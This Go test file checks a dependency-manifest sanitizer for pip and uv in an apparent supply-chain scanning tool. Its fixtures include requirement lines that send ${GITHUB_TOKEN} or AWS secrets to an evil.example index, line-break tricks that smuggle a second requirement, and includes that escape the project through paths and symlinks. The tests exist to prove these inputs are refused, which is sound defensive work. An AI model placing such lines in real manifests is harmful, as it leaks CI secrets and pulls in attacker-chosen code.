package catalog

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"sync"
	"testing"

	"github.com/ossprey/ossprey-cli/internal/warn"
)

func sanitize(t *testing.T, files map[string]string) (string, *pipSanitizer, error) {
	t.Helper()
	src := t.TempDir()
	writeTree(t, src, files)
	s := newPipSanitizer(context.Background(), t.TempDir(), src)
	out, err := s.file(filepath.Join(src, "requirements.txt"))
	if err != nil {
		return "", s, err
	}
	data, _ := os.ReadFile(out)
	return string(data), s, nil
}

// A dependency string may hold a line break (TOML allows it); its marker must
// not smuggle a second requirement such as a local path.
func TestPipSafeRequirementRejectsLineBreaks(t *testing.T) {
	for _, spec := range []string{
		"requests; python_version >= '0'\n./local",
		"requests; python_version >= '0'\r./local",
		"requests\x00",
		`requests; python_version > "${GITHUB_TOKEN}"`,
		"${PKG}==1.0",
		// Python's splitlines, which pip reads a file with, splits on these too.
		"requests; python_version >= '0'\u2028./local",
		"requests; python_version >= '0'\u2029./local",
		"requests; python_version >= '0'\u0085./local",
		"requests; python_version >= '0'\x85./local",
		"requests; python_version >= '0'\v./local",
		"requests; python_version >= '0'\f./local",
		"requests; python_version >= '0'\x1c./local",
		// pip strips the extras before taking the name for a local archive.
		"evilpkg-1.0.tar.gz[extra]",
		"evilpkg-1.0.whl [x]",
		"evilpkg-1.0.zip[a,b]>=1",
	} {
		if got, ok := pipSafeRequirement(spec); ok {
			t.Errorf("pipSafeRequirement(%q) kept %q", spec, got)
		}
	}
}

// Every option on an option line is judged; the first being harmless does
// not carry the rest through, and what is dropped is recorded.
func TestPipSanitizerJudgesEveryOptionOnALine(t *testing.T) {
	got, s, err := sanitize(t, map[string]string{
		"requirements.txt": "--no-index --no-binary=:all: --pre\n--prefer-binary --use-pep517\n--require-hashes\nrequests\n",
	})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(got, "no-binary") || strings.Contains(got, "pep517") {
		t.Errorf("an unvetted option reached the copy:\n%s", got)
	}
	for _, want := range []string{"--no-index\n", "--pre\n", "--prefer-binary\n"} {
		if !strings.Contains(got, want) {
			t.Errorf("copy lacks %q:\n%s", want, got)
		}
	}
	if !slices.Contains(s.dropped, "option --no-binary") || !slices.Contains(s.dropped, "option --use-pep517") {
		t.Errorf("dropped options not recorded: %v", s.dropped)
	}
	if slices.Contains(s.dropped, "option --require-hashes") {
		t.Errorf("--require-hashes changes nothing that resolves and should not be reported: %v", s.dropped)
	}
}

// pip expands ${VAR} in a requirements file, so a repository index URL must
// not be able to carry a runner secret off the machine.
func TestPipSanitizerRefusesEnvironmentExpansionInOptions(t *testing.T) {
	got, s, err := sanitize(t, map[string]string{
		"requirements.txt": "--index-url https://evil.example/${GITHUB_TOKEN}/simple\n" +
			"--extra-index-url=https://evil.example/$\\{AWS_SECRET_ACCESS_KEY}\n-f \"${HOME}/wheels\"\nrequests\n",
	})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(got, "${") || strings.Contains(got, "evil") {
		t.Errorf("an option naming an environment variable reached the copy:\n%s", got)
	}
	if len(s.dropped) != 3 {
		t.Errorf("dropped = %v, want all three options", s.dropped)
	}
}

// A source name at the filesystem's limit still yields a copy name under it.
func TestPipSanitizerBoundsCopyNames(t *testing.T) {
	name := strings.Repeat("r", 250) + ".txt"
	got, _, err := sanitize(t, map[string]string{"requirements.txt": "-r " + name + "\n", name: "idna\n"})
	if err != nil {
		t.Fatalf("a long include name failed: %v", err)
	}
	tok, _ := shlexSplit(strings.TrimSpace(got))
	if len(filepath.Base(tok[1])) > 64 {
		t.Errorf("copy name %d bytes long: %s", len(filepath.Base(tok[1])), tok[1])
	}
}

// Two includes whose names map to the same identifier must not overwrite
// each other's copy.
func TestPipSanitizerIncludesGetDistinctCopies(t *testing.T) {
	got, s, err := sanitize(t, map[string]string{
		"requirements.txt": "-r a-b.txt\n-r a_b.txt\n",
		"a-b.txt":          "flask\n",
		"a_b.txt":          "click\n",
	})
	if err != nil {
		t.Fatal(err)
	}
	var both string
	for _, line := range strings.Split(strings.TrimSpace(got), "\n") {
		tok, err := shlexSplit(line)
		if err != nil || len(tok) != 2 {
			t.Fatalf("bad include line %q", line)
		}
		data, _ := os.ReadFile(tok[1])
		both += string(data)
	}
	if !strings.Contains(both, "flask") || !strings.Contains(both, "click") {
		t.Errorf("an include's copy was overwritten: %q (written %v)", both, s.written)
	}
}

// Includes are repository content read before pip's timeout starts: a device,
// an oversized file or endless nesting fails the manifest instead of hanging
// or exhausting memory, and a cancelled scan stops.
func TestPipSanitizerBoundsIncludes(t *testing.T) {
	if runtime.GOOS != "windows" {
		if _, _, err := sanitize(t, map[string]string{"requirements.txt": "-r /dev/zero\n"}); err == nil {
			t.Error("an include of /dev/zero was read")
		}
	}
	big := strings.Repeat("a\n", maxPipRequirementsBytes/2+1)
	if _, _, err := sanitize(t, map[string]string{"requirements.txt": "-r big.txt\n", "big.txt": big}); err == nil {
		t.Error("an oversized include was read")
	}
	chain := map[string]string{"requirements.txt": "-r r0.txt\n"}
	for i := 0; i <= maxPipIncludeDepth+1; i++ {
		chain[fmt.Sprintf("r%d.txt", i)] = fmt.Sprintf("-r r%d.txt\n", i+1)
	}
	if _, _, err := sanitize(t, chain); err == nil || !strings.Contains(err.Error(), "nest") {
		t.Errorf("an unbounded include chain: err = %v", err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	src := t.TempDir()
	writeTree(t, src, map[string]string{"requirements.txt": "requests\n"})
	if _, err := newPipSanitizer(ctx, t.TempDir(), src).file(filepath.Join(src, "requirements.txt")); err == nil {
		t.Error("a cancelled scan went on sanitizing")
	}
}

// Paths written into the copy, and include values read from the source, are
// shell-style tokens: a space survives both ways.
func TestPipSanitizerQuotesPaths(t *testing.T) {
	src := filepath.Join(t.TempDir(), "my project")
	writeTree(t, src, map[string]string{
		"requirements.txt": "-r \"more reqs.txt\"\n-c 'my cons.txt'\n",
		"more reqs.txt":    "idna\n",
		"my cons.txt":      "idna<4\n",
	})
	dst := filepath.Join(t.TempDir(), "scratch dir")
	if err := os.MkdirAll(dst, 0o755); err != nil {
		t.Fatal(err)
	}
	s := newPipSanitizer(context.Background(), dst, src)
	out, err := s.file(filepath.Join(src, "requirements.txt"))
	if err != nil {
		t.Fatalf("a quoted include failed: %v", err)
	}
	data, _ := os.ReadFile(out)
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		tok, err := shlexSplit(line)
		if err != nil || len(tok) != 2 {
			t.Fatalf("line %q does not split into one option and one value", line)
		}
		if _, err := os.Stat(tok[1]); err != nil {
			t.Errorf("%s names a path that does not exist: %v", tok[0], err)
		}
	}
}

// The real pip reads those quoted paths back, from a scratch directory and a
// project with spaces in them.
func TestPipResolvesThroughPathsWithSpaces(t *testing.T) {
	realToolsOnly(t, "python3")
	requirePip(t)
	tmp := filepath.Join(t.TempDir(), "tmp dir")
	if err := os.MkdirAll(tmp, 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("TMPDIR", tmp)
	proj := filepath.Join(t.TempDir(), "my project")
	writeTree(t, proj, map[string]string{
		"requirements.txt": "--no-index\n-r \"more reqs.txt\"\n",
		"more reqs.txt":    "--no-index\n",
	})
	ctx := warn.NewContext(context.Background(), false)
	if _, err := Catalog(ctx, proj, Options{SkipVersionLookup: true}); err != nil {
		t.Fatal(err)
	}
	if got := warn.Unresolved(ctx); len(got) != 0 {
		t.Errorf("unresolved = %v\n%s", got, warn.Drain(ctx))
	}
}

// What was left out is described, never quoted: a direct reference can
// carry a credential, and the warning reaches CI logs.
func TestLeftOutNeverQuotesTheRequirement(t *testing.T) {
	src := t.TempDir()
	writeTree(t, src, map[string]string{"requirements.txt": "private @ https://deploy:hunter2@pkgs.example/p.whl?token=s3cret\n" +
		"-e git+https://ghp_abc123@github.com/o/r.git#egg=r\n--index-url=https://x/${SECRET_TOKEN}\nsecretpkg-s3cr3t.tar.gz\n" +
		"--token-hunter2\n--no-binary :all:\nevilpkg-1.0.tar.gz[x]\n"})
	s := newPipSanitizer(context.Background(), t.TempDir(), src)
	if _, err := s.file(filepath.Join(src, "requirements.txt")); err != nil {
		t.Fatal(err)
	}
	if strings.Count(strings.Join(s.dropped, "\n"), "a local archive") != 2 {
		t.Errorf("an archive with extras was not described as one: %v", s.dropped)
	}
	// One warning alone prints its One line rather than a count, so that
	// line is checked on its own for every kind of dropped item.
	for _, d := range s.dropped {
		ctx := warn.NewContext(context.Background(), false)
		NewPipCataloger(src).leftOut(ctx, filepath.Join(src, "requirements.txt"), []string{d})
		out := warn.Drain(ctx)
		if !strings.Contains(out, d) {
			t.Errorf("single warning does not carry its description %q:\n%s", d, out)
		}
		for _, secret := range []string{"hunter2", "s3cret", "ghp_abc123", "SECRET_TOKEN", "s3cr3t", "token-"} {
			if strings.Contains(out, secret) {
				t.Errorf("single warning leaked %q:\n%s", secret, out)
			}
		}
	}
	for _, verbose := range []bool{false, true} {
		ctx := warn.NewContext(context.Background(), verbose)
		c := NewPipCataloger(src)
		c.leftOut(ctx, filepath.Join(src, "requirements.txt"), s.dropped)
		out := warn.Drain(ctx)
		for _, secret := range []string{"hunter2", "s3cret", "ghp_abc123", "SECRET_TOKEN", "s3cr3t", "token-"} {
			if strings.Contains(out, secret) {
				t.Errorf("verbose=%v: warning leaked %q:\n%s", verbose, secret, out)
			}
		}
		if !verbose {
			continue
		}
		for _, want := range []string{"a URL or direct reference", "an editable (-e)", "--index-url naming an environment variable", "a local archive", "an unrecognised option", "option --no-binary"} {
			if !strings.Contains(out, want) {
				t.Errorf("warning does not say %q:\n%s", want, out)
			}
		}
	}
}

// With no pip, a project whose dependencies are dynamic is still unresolved.
func TestNoPipMarksDynamicDependencies(t *testing.T) {
	got := unresolvedFor(t, map[string]string{
		"pyproject.toml": "[project]\nname = \"app\"\nversion = \"0.1.0\"\ndynamic = [\"dependencies\"]\n",
	})
	if !slices.Equal(got, []string{"pyproject.toml"}) {
		t.Errorf("unresolved = %v, want [pyproject.toml]", got)
	}
}

// A pyproject that does not parse resolves nothing, so it is unresolved on
// the uv path too, unless a lock beside it covers it.
func TestMalformedPyprojectNeedsBuild(t *testing.T) {
	dir := t.TempDir()
	writeTree(t, dir, map[string]string{"pyproject.toml": "[project\nname = "})
	p := filepath.Join(dir, "pyproject.toml")
	if pyprojectNeedsBuild(p) == nil {
		t.Error("a malformed pyproject read as needing nothing")
	}
	writeTree(t, dir, map[string]string{"uv.lock": "version = 1\n\n[[package]]\nname = \"requests\"\nversion = \"2.31.0\"\nsource = { registry = \"https://pypi.org/simple\" }\n"})
	if err := pyprojectNeedsBuild(p); err != nil {
		t.Errorf("a lock beside it covers it: %v", err)
	}
}

// uv expands ${VAR} in requirements files (options and requirements alike)
// and in pyproject dependencies, so a manifest naming one is never handed to
// it: the variable's value would reach a host the repository chose.
func TestUVNeverExpandsRepositoryEnvVars(t *testing.T) {
	var seen []string
	var mu sync.Mutex
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		seen = append(seen, r.URL.String())
		mu.Unlock()
		if r.URL.Path == "/deps.txt" {
			// A remote include: uv fetches it and expands what it holds.
			fmt.Fprintf(w, "requests @ http://%s/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\n", r.Host)
			return
		}
		http.NotFound(w, r)
	}))
	defer srv.Close()
	t.Setenv("LEAKTEST_SECRET", "topsecret123")
	cases := map[string]map[string]string{
		"index url":         {"requirements.txt": "--index-url " + srv.URL + "/${LEAKTEST_SECRET}/simple\nrequests\n"},
		"direct url":        {"requirements.txt": "requests @ " + srv.URL + "/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\n"},
		"included file":     {"requirements.txt": "-r more.txt\n", "more.txt": "--extra-index-url=" + srv.URL + "/${LEAKTEST_SECRET}/simple\nrequests\n"},
		"pyproject":         {"pyproject.toml": "[project]\nname = \"app\"\nversion = \"0.1.0\"\ndependencies = [\"requests @ " + srv.URL + "/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\"]\n"},
		"remote include":    {"requirements.txt": "-r " + srv.URL + "/deps.txt\n"},
		"remote constraint": {"requirements.txt": "-c " + srv.URL + "/deps.txt\nrequests\n"},
		// uv export re-locks a stale uv.lock from every list uv locks, not
		// only [project]'s (verified against uv 0.11).
		"dependency group (export)":         {"pyproject.toml": exportProject("[dependency-groups]\ndev = [\"requests @ " + srv.URL + "/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\"]\n"), "uv.lock": staleUVLock},
		"tool.uv dev-dependencies (export)": {"pyproject.toml": exportProject("[tool.uv]\ndev-dependencies = [\"requests @ " + srv.URL + "/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\"]\n"), "uv.lock": staleUVLock},
		// uv locks every workspace member and reads every path source's
		// pyproject (both verified against uv 0.11, export and pip compile).
		"workspace member (export)": {
			"pyproject.toml":            exportProject("[tool.uv.workspace]\nmembers = [\"packages/*\"]\n"),
			"uv.lock":                   staleUVLock,
			"packages/a/pyproject.toml": "[project]\nname = \"a\"\nversion = \"0.1.0\"\ndependencies = [\"requests @ " + srv.URL + "/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\"]\n",
		},
		"path source": {
			"pyproject.toml":                "[project]\nname = \"app\"\nversion = \"0.1.0\"\nrequires-python = \">=3.9\"\ndependencies = [\"lib\"]\n\n[tool.uv.sources]\nlib = { path = \"vendor-src/lib\" }\n",
			"vendor-src/lib/pyproject.toml": "[project]\nname = \"lib\"\nversion = \"0.1.0\"\ndependencies = [\"requests @ " + srv.URL + "/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\"]\n",
		},
		// A local project named in a requirements file is read by uv, its
		// pyproject expanded like any other (verified against uv 0.11).
		"local project":    localProjectCase(srv.URL, "./lib\n"),
		"editable project": localProjectCase(srv.URL, "-e ./lib\n"),
		"file reference":   localProjectCase(srv.URL, "lib @ file:./lib\n"),
		"included local project": func() map[string]string {
			files := localProjectCase(srv.URL, "-r sub/more.txt\n")
			files["sub/more.txt"] = "./lib\n" // read against the working directory, not sub
			return files
		}(),
		"tool.uv override-dependencies (export)": {"pyproject.toml": exportProject("[tool.uv]\noverride-dependencies = [\"idna @ " + srv.URL + "/${LEAKTEST_SECRET}/idna-3.7-py3-none-any.whl\"]\n"), "uv.lock": staleUVLock},
	}
	for name, files := range cases {
		t.Run(name, func(t *testing.T) {
			realToolsOnly(t, "uv", "python3")
			mu.Lock()
			seen = nil // each case judged on its own requests
			mu.Unlock()
			proj := t.TempDir()
			writeTree(t, proj, files)
			// uv reads a relative local project against its working
			// directory, which is the scan's: run from the project, as
			// `ossprey scan .` does.
			t.Chdir(proj)
			ctx := warn.NewContext(context.Background(), true) // verbose: two manifests fail where a member or source does
			if _, err := Catalog(ctx, proj, Options{SkipVersionLookup: true}); err != nil {
				t.Fatal(err)
			}
			mu.Lock()
			defer mu.Unlock()
			for _, u := range seen {
				if strings.Contains(u, "topsecret123") {
					t.Fatalf("uv sent the secret: %s", u)
				}
			}
			manifest := "requirements.txt"
			if _, ok := files["pyproject.toml"]; ok {
				manifest = "pyproject.toml"
			}
			if got := warn.Unresolved(ctx); !slices.Contains(got, manifest) {
				t.Errorf("unresolved = %v, want %s", got, manifest)
			}
			if out := warn.Drain(ctx); !strings.Contains(out, "environment variable") {
				t.Errorf("no warning says why:\n%s", out)
			}
		})
	}
}

// localProjectCase is a requirements file naming the project in lib, whose
// own dependencies name ${LEAKTEST_SECRET}.
func localProjectCase(srv, requirements string) map[string]string {
	return map[string]string{
		"requirements.txt": requirements,
		"lib/pyproject.toml": "[project]\nname = \"lib\"\nversion = \"0.1.0\"\ndependencies = [\"requests @ " + srv + "/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\"]\n" +
			// uv reads static metadata only with a declared backend.
			"[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n",
	}
}

// exportProject is a pyproject uv exports from a uv.lock, plus extra tables.
func exportProject(extra string) string {
	return "[project]\nname = \"app\"\nversion = \"0.1.0\"\nrequires-python = \">=3.9\"\ndependencies = [\"idna\"]\n\n" + extra
}

// staleUVLock locks nothing, so uv export re-locks from the pyproject.
const staleUVLock = "version = 1\nrequires-python = \">=3.9\"\n"

// An include is read only inside the scan root: an absolute path, a .. or a
// symlink out of it would send another file's lines to the index.
func TestPipSanitizerConfinesIncludesToTheRoot(t *testing.T) {
	outside := t.TempDir()
	writeTree(t, outside, map[string]string{"secret.txt": "s3cretpkg\n"})
	secret := filepath.Join(outside, "secret.txt")
	cases := map[string]map[string]string{
		"absolute": {"requirements.txt": "-r " + shlexQuote(secret) + "\n"},
		"dotdot":   {"requirements.txt": "-c ../" + filepath.Base(outside) + "/secret.txt\n"},
	}
	for name, files := range cases {
		t.Run(name, func(t *testing.T) {
			parent := filepath.Dir(outside)
			src, err := os.MkdirTemp(parent, "proj-")
			if err != nil {
				t.Fatal(err)
			}
			defer os.RemoveAll(src)
			writeTree(t, src, files)
			_, err = newPipSanitizer(context.Background(), t.TempDir(), src).file(filepath.Join(src, "requirements.txt"))
			if !errors.Is(err, errOutsideRoot) {
				t.Errorf("err = %v, want errOutsideRoot", err)
			}
			if err := uvExpandsEnv(context.Background(), filepath.Join(src, "requirements.txt"), src); !errors.Is(err, errOutsideRoot) {
				t.Errorf("uv: err = %v, want errOutsideRoot", err)
			}
		})
	}
	if runtime.GOOS != "windows" {
		src := t.TempDir()
		writeTree(t, src, map[string]string{"requirements.txt": "-r inc.txt\n"})
		if err := os.Symlink(secret, filepath.Join(src, "inc.txt")); err != nil {
			t.Fatal(err)
		}
		if _, err := newPipSanitizer(context.Background(), t.TempDir(), src).file(filepath.Join(src, "requirements.txt")); !errors.Is(err, errOutsideRoot) {
			t.Errorf("symlink: err = %v, want errOutsideRoot", err)
		}
		if err := uvExpandsEnv(context.Background(), filepath.Join(src, "requirements.txt"), src); !errors.Is(err, errOutsideRoot) {
			t.Errorf("uv symlink: err = %v, want errOutsideRoot", err)
		}
	}
	if runtime.GOOS != "windows" {
		// pip and uv apply a .. after following the link before it (both
		// verified), so jump/../deps.txt is the file beside the link's
		// target, here outside the root, not the deps.txt beside jump.
		src := t.TempDir()
		writeTree(t, src, map[string]string{"requirements.txt": "-r jump/../secret.txt\n", "secret.txt": "idna\n"})
		if err := os.MkdirAll(filepath.Join(outside, "inner"), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(filepath.Join(outside, "inner"), filepath.Join(src, "jump")); err != nil {
			t.Fatal(err)
		}
		if _, err := newPipSanitizer(context.Background(), t.TempDir(), src).file(filepath.Join(src, "requirements.txt")); !errors.Is(err, errOutsideRoot) {
			t.Errorf("link then ..: err = %v, want errOutsideRoot", err)
		}
		if err := uvExpandsEnv(context.Background(), filepath.Join(src, "requirements.txt"), src); !errors.Is(err, errOutsideRoot) {
			t.Errorf("uv link then ..: err = %v, want errOutsideRoot", err)
		}
	}
	if _, _, err := sanitize(t, map[string]string{"requirements.txt": "-r sub/in.txt\n", "sub/in.txt": "idna\n"}); err != nil {
		t.Errorf("an include inside the root failed: %v", err)
	}
	in := t.TempDir()
	writeTree(t, in, map[string]string{"requirements.txt": "-r sub/in.txt\n", "sub/in.txt": "idna\n"})
	if err := uvExpandsEnv(context.Background(), filepath.Join(in, "requirements.txt"), in); err != nil {
		t.Errorf("uv: an include inside the root failed: %v", err)
	}
}

// A line over the scanner's 1 MiB limit fails the file instead of hiding
// what follows it.
func TestOverlongRequirementLineFails(t *testing.T) {
	body := "# " + strings.Repeat("x", 1<<20+10) + "\n--index-url https://evil/${SECRET}\nrequests\n"
	if _, _, err := sanitize(t, map[string]string{"requirements.txt": body}); err == nil {
		t.Error("pip: an overlong line was silently skipped")
	}
	dir := t.TempDir()
	writeTree(t, dir, map[string]string{"requirements.txt": body})
	if err := uvExpandsEnv(context.Background(), filepath.Join(dir, "requirements.txt"), dir); err == nil {
		t.Error("uv: an overlong line hid a ${VAR} after it")
	}
}

// pyprojectExpandsEnv reads the raw lists: an entry naming the project
// itself still reaches uv, and a file that does not parse is an error.
func TestPyprojectExpandsEnvReadsRawEntries(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "pyproject.toml")
	writeTree(t, dir, map[string]string{"pyproject.toml": "[project]\nname = \"app\"\nversion = \"0.1.0\"\n[project.optional-dependencies]\nx = [\"app[y] @ https://h/${SECRET}/app.whl\"]\n"})
	if err := pyprojectExpandsEnv(p); !errors.Is(err, errNamesEnvVar) {
		t.Errorf("self-reference: err = %v, want errNamesEnvVar", err)
	}
	writeTree(t, dir, map[string]string{"pyproject.toml": "[project\nname = "})
	if err := pyprojectExpandsEnv(p); err == nil {
		t.Error("a pyproject that does not parse passed")
	}
}

// shlexSplit splits on Python shlex's whitespace (' \t\r\n') only, so a
// non-breaking space, vertical tab or form feed stays inside a token as pip
// reads it (verified against python3 shlex.split).
func TestShlexSplitUsesPythonWhitespace(t *testing.T) {
	for in, want := range map[string][]string{
		"-r deps all.in": {"-r", "deps all.in"},
		"a\vb\fc":        {"a\vb\fc"},
		" a\tb\r\nc ":    {"a", "b", "c"},
	} {
		got, err := shlexSplit(in)
		if err != nil || !slices.Equal(got, want) {
			t.Errorf("shlexSplit(%q) = %q, %v; want %q", in, got, err, want)
		}
	}
}

// uvProjectExpandsEnv reads what uv reads beside a manifest: a clean workspace
// passes, a member is refused for a sibling it is locked with, and a glob it
// cannot list refuses rather than reading less.
func TestUVProjectExpandsEnvFollowsTheWorkspace(t *testing.T) {
	ws := "[project]\nname = \"root\"\nversion = \"0.1.0\"\n\n[tool.uv.workspace]\nmembers = [\"packages/*\"]\n"
	clean := "[project]\nname = \"a\"\nversion = \"0.1.0\"\ndependencies = [\"idna\"]\n"
	dirty := "[project]\nname = \"b\"\nversion = \"0.1.0\"\ndependencies = [\"x @ https://h/${SECRET}/x.whl\"]\n"
	dir := t.TempDir()
	writeTree(t, dir, map[string]string{"pyproject.toml": ws, "packages/a/pyproject.toml": clean})
	if err := uvProjectExpandsEnv(filepath.Join(dir, "pyproject.toml"), dir); err != nil {
		t.Errorf("clean workspace: %v", err)
	}
	writeTree(t, dir, map[string]string{"packages/b/pyproject.toml": dirty})
	if err := uvProjectExpandsEnv(filepath.Join(dir, "packages", "a", "pyproject.toml"), dir); !errors.Is(err, errNamesEnvVar) {
		t.Errorf("member with a dirty sibling: err = %v, want errNamesEnvVar", err)
	}
	other := t.TempDir()
	writeTree(t, other, map[string]string{"pyproject.toml": strings.Replace(ws, "packages/*", "packages/**", 1)})
	if err := uvProjectExpandsEnv(filepath.Join(other, "pyproject.toml"), other); !errors.Is(err, errUVProjectUnplaced) {
		t.Errorf("** glob: err = %v, want errUVProjectUnplaced", err)
	}
}

// A local project outside the scan is refused like an include outside it, and
// a clean one inside resolves.
func TestUVExpandsEnvConfinesLocalProjects(t *testing.T) {
	outside := t.TempDir()
	writeTree(t, outside, map[string]string{"lib/pyproject.toml": "[project]\nname = \"lib\"\nversion = \"0.1.0\"\n"})
	src := t.TempDir()
	writeTree(t, src, map[string]string{"requirements.txt": filepath.Join(outside, "lib") + "\n"})
	if err := uvExpandsEnv(context.Background(), filepath.Join(src, "requirements.txt"), src); !errors.Is(err, errOutsideRoot) {
		t.Errorf("project outside the root: err = %v, want errOutsideRoot", err)
	}
	in := t.TempDir()
	writeTree(t, in, map[string]string{"requirements.txt": "-e ./lib\nrequests\n", "lib/pyproject.toml": "[project]\nname = \"lib\"\nversion = \"0.1.0\"\ndependencies = [\"idna\"]\n"})
	if err := uvExpandsEnv(context.Background(), filepath.Join(in, "requirements.txt"), in); err != nil {
		t.Errorf("clean project inside the root: %v", err)
	}
}

// uv reads the local projects [tool.uv]'s override and constraint lists name,
// as it does a dependency's (verified against uv 0.11 with an override).
func TestUVProjectExpandsEnvFollowsOverrides(t *testing.T) {
	for _, key := range []string{"override-dependencies", "constraint-dependencies", "build-constraint-dependencies"} {
		dir := t.TempDir()
		lib := filepath.Join(dir, "lib")
		u := (&url.URL{Scheme: "file", Path: filepath.ToSlash(lib)}).String()
		writeTree(t, dir, map[string]string{
			"pyproject.toml":     "[project]\nname = \"app\"\nversion = \"0.1.0\"\n\n[tool.uv]\n" + key + " = [\"lib @ " + u + "\"]\n",
			"lib/pyproject.toml": "[project]\nname = \"lib\"\nversion = \"0.1.0\"\ndependencies = [\"x @ https://h/${SECRET}/x.whl\"]\n",
		})
		if err := uvProjectExpandsEnv(filepath.Join(dir, "pyproject.toml"), dir); !errors.Is(err, errNamesEnvVar) {
			t.Errorf("%s: err = %v, want errNamesEnvVar", key, err)
		}
	}
}
